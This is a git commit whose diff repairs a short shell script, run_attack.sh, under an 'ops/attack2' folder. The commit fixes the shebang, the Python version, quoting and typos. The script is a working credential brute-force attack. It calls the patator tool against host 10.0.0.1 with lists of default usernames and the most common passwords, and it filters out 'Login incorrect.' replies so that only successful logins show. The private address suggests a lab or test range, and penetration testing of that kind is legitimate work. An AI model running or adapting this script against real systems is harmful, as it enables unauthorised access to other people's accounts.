c0a3a884e49edcc20e95a0c1c49bda27553ce437
lunaai <88792933+lunaai@users.noreply.github.com>
2021-08-30 00:01:21 -0700

    Update run_attack.sh
    fixed bash
    changed Python to Python3
    fixed parenthesis
    fixed "ignore" typos

--- ops/attack2/run_attack.sh
+++ ops/attack2/run_attack.sh
@@ -1,5 +1,5 @@
-!#/bin/bash
+#!/bin/bash
 
 attack=$1
 
-python /patator/patator.py "$attack$ host=10.0.0.1 user=cirt-default-usernames.txt password=2020-200_most_used_passwords.txt 0=logins.txt 1=passwords.txt -x ingnore:message='Login incorrect.' -x ignmore,reset,retry:code=500
+python3 /patator/patator.py "$attack" host=10.0.0.1 user=cirt-default-usernames.txt password=2020-200_most_used_passwords.txt 0=logins.txt 1=passwords.txt -x ignore:message='Login incorrect.' -x ignore,reset,retry:code=500
